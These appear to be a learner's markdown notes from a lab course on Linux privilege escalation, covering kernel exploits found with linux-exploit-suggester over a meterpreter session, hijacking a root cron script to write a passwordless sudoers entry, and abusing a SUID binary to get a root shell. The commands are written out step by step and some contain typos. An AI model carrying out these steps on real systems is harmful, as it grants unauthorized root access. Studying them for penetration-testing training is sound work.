# Linux Kernel Exploits
- to execute arbitrary coe in order to run privileged system commands or to obtain a system shell
- differ based ont the kernel version and distribution
- methodology
	- identifying kernel vulns - tool linux-exploit-suggester
	- download, compile, and transfer kernel exploit on the target sys
- tools
	- Linux-Exploit-Suggester
	- GitHub
- **Process**
	- obtain a meterpreter session on the target
	- after that collect data- `sysinfo`, `getuid`, 
	- download and transfer the tool to the target system
		- `cd /tmp`
		- upload <path to file>
	- shell
	- `/bin/bash -i`
	- `chmod +x les.sh`
	- `./les.sh`
	- will provide us with the vulns 
	- download the exploit and compile it on your machine
	- transfer it to the target system
	- run it
	- If it does not work, upload the file before compilation
	- compile it on the target system
	- you have a new user with root privileges

### Misconfigured Cron Jobs
- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule
- crontab file
- Cron jobs can be run as any user on the system
- find and identify cron jobs scheduled by the root user
- **Exploitation Process**
	- `crontab -l`
	- `ls -al`
	- `cd /`
	- `grep -rnw /usr -e "home/student/message"`
	- once find the script, edit it 
	- `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
	- `sudo -l`
	- `sudo su`

### Exploiting SUID Binaries
- Set Owner User ID
- a permission like read, wirte, and execute
- provides users with the ability to execute a script or binary with permissions of the file owner
- factors important
- owner of SUID binary
- Access permissions
-**Exploitation Process**
	- `ls -la`
	- find the file which has the SUID permission enabled s
	- `file welcom` --> welcome is the name of file
	- `strings welcom`
	- `rm greetings`
	- `co /bin/bash greetings`
	- ` ./welcom`
